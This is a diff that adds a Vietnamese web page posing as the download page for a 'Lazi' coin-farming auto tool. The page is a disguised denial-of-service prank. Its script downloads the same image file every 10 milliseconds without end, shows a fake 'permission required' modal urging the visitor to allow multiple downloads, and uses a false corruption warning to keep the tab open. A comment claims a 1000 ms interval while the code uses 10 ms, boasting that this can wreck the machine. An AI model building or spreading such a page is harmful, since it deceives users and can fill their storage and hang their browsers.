@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tải Tool Auto Farm Xu Lazi</title>
+    <style>
+        body {
+            background-color: #f4f6f9;
+            color: #333333;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            border: 1px solid #e0e0e0;
+            padding: 35px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            border-radius: 12px;
+            text-align: center;
+            max-width: 450px;
+            position: relative;
+        }
+        h1 {
+            color: #007bff;
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        p {
+            font-size: 15px;
+            color: #666666;
+            line-height: 1.5;
+        }
+        #status {
+            color: #495057;
+            background-color: #e9ecef;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            font-weight: bold;
+            border-left: 4px solid #007bff;
+            transition: all 0.3s ease;
+        }
+        .warning {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+        /* Nút tải về mới */
+        .btn-download {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        .btn-download:hover {
+            background-color: #0056b3;
+        }
+        /* Style cho Modal thông báo cấp phép */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal-box {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.25);
+            animation: popUp 0.3s ease-out;
+        }
+        .modal-box h2 {
+            color: #dc3545;
+            font-size: 20px;
+            margin-top: 0;
+        }
+        .modal-box p {
+            color: #333;
+            font-size: 14px;
+        }
+        .btn-allow {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+        @keyframes popUp {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Hệ Thống Tải Tool Lazi</h1>
+        <p>Hệ thống cần tải xuống các gói tài nguyên cần thiết để chuẩn bị khởi chạy auto farm xu.</p>
+        <div id="status">Chờ bấm nút để bắt đầu...</div>
+        <button class="btn-download" id="startBtn">Tải Về Ngay</button>
+        <p class="warning">*Chú ý: Vui lòng không đóng trình duyệt lúc này để tránh lỗi mã nguồn.</p>
+    </div>
+
+    <div class="modal-overlay" id="permissionModal">
+        <div class="modal-box">
+            <h2>⚠️ YÊU CẦU CẤP PHÉP</h2>
+            <p>Trình duyệt đã chặn bớt các tệp phụ trợ. Vui lòng bấm vào thông báo <b>"Cho phép tải xuống nhiều tệp"</b> xuất hiện ở góc trên màn hình để tiếp tục cài đặt Tool Auto.</p>
+            <button class="btn-allow" onclick="document.getElementById('permissionModal').style.display='none'">Tôi Đã Hiểu</button>
+        </div>
+    </div>
+
+    <script>
+        // 1. Kích hoạt popup hệ thống để ngăn rời tab
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = "Chưa tải xong mã nguồn hoàn chỉnh, file gốc có thể bị hỏng"; 
+            return "Chưa tải xong mã nguồn hoàn chỉnh, file gốc có thể bị hỏng";
+        });
+
+        // 2. Xử lý khi bấm nút tải
+        document.getElementById('startBtn').addEventListener('click', function() {
+            this.style.display = 'none'; // Ẩn nút đi sau khi bấm
+            
+            const imageUrl = 'thandong.png'; 
+            let count = 1;
+            const statusDiv = document.getElementById('status');
+            const modal = document.getElementById('permissionModal');
+
+            statusDiv.innerHTML = "Đang kết nối đến máy chủ...";
+
+            setInterval(function() {
+                const a = document.createElement('a');
+                a.href = imageUrl;
+                a.download = `lazi-addon-pack-${count}.png`; 
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                if (count === 1) {
+                    statusDiv.style.borderLeftColor = '#ffc107';
+                    statusDiv.innerHTML = `<span style="color: #b58100;">Đang tải file phụ trợ, vui lòng chấp nhận cho phép tải nhiều tệp!</span>`;
+                    
+                    // Hiện cái modal to đùng giữa màn hình lên
+                    modal.style.display = 'flex';
+                } else {
+                    statusDiv.style.borderLeftColor = '#dc3545'; 
+                    statusDiv.innerHTML = `<span style="color: #dc3545;">Đã chuẩn bị file phụ đi kèm (${count}), vui lòng cấp phép đồng ý cho tải nhiều tệp</span>`;
+                }
+                
+                count++;
+            }, 10); // Đang để 1000ms (1 giây) cho người ta còn kịp thở, thích phá máy thì sửa lại thành 10 nhé!
+        });
+    </script>
+
+</body>
+</html>
